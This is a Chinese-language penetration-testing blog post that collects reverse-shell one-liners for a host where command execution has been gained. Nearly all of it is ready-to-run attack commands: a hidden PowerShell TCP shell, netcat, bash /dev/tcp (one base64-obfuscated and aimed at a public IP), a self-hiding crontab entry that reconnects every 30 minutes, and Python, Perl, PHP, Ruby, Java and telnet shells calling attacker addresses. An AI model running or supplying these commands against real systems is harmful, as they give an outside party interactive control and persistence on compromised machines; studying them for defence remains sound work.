---
draft: false
date: 2016-08-06 08:36:53
title: 反弹 shell 小结
description: 
categories:
  - Pentest
tags:
  - shell
---

当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令

### 0x00 PowerShell
```
#更换ip和端口即可
本地：nc -lv 8888
目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.10.10.10';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};
```

### 0x01 Netcat
```
公网：nc -lv 8888
目标：nc -e cmd.exe 123.123.123.123 8888 #nc -e /bin/sh 10.10.10.10 8888

#获得交互式的shell：
在得到shell后执行：python -c "import pty; pty.spawn('/bin/bash')"
```

### 0x02 Bash
```
bash -i >& /dev/tcp/10.10.10.10/8888 0>&1
注：这个由解析shell的bash完成，有些时候不支持

reber@wyb:~$ cat tmp.txt 
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzExNC4xMTUuMTgzLjg2LzY2NjYgMD4mMQ==
reber@wyb:~$ cat tmp.txt |base64 -d
/bin/bash -i >& /dev/tcp/114.115.183.86/6666 0>&1

reber@wyb:~$ {cat,tmp.txt}|{base64,-d}|{bash,-i}
```

### 0x03 crontab
```
下面这条命令执行后会每隔30分钟反弹一次：
(crontab -l;printf "*/30 * * * * exec 9<> /dev/tcp/10.10.10.10/8888;exec 0<&9;
exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|
crontab -
```

### 0x04 Python
```python
# 下面为1条命令
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM);s.connect(("10.10.10.10",8888));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 0x05 Perl
```
# 下面为1条命令
perl -e 'use Socket;$i="10.10.10.10";$p=8888;socket(S,PF_INET,SOCK_STREAM,
getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 0x06 PHP
```
php -r '$sock=fsockopen("10.10.10.10",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 0x07 Ruby
```
# 下面为1条命令
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",8888).to_i;
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### 0x08 Java
```
# 下面为3条命令
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/8888;cat <&5 | 
while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### 0x09 telnet
```
两种方法：
mknod backpipe p && telnet 173.214.173.151 8080 0backpipe
telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
第一种hacker运行：nc -vlp 8080
第二种hacker运行：nc -vlp 8080和nc -vlp 8888
```


#### Reference(侵删)：
* [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [https://www.91ri.org/6620.html](https://www.91ri.org/6620.html)
